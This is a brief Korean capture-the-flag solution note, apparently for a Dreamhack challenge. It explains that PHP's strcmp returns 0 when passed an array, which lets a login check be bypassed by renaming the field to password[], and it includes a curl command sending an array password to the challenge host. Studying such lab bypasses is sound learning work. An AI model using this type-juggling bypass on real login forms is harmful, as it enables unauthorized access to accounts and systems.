'''
solution..!
- strcmp는 배열로 값을 전달할 경우 0을 리턴하는 취약점이 있음
- 개발자도구에서 name을 password[] 로 바꾸고 값 전송하면 해결
'''

# curl -X POST http://host3.dreamhack.games:23881/ -H "Content-Type: application/json" -d '{"password": [123]}'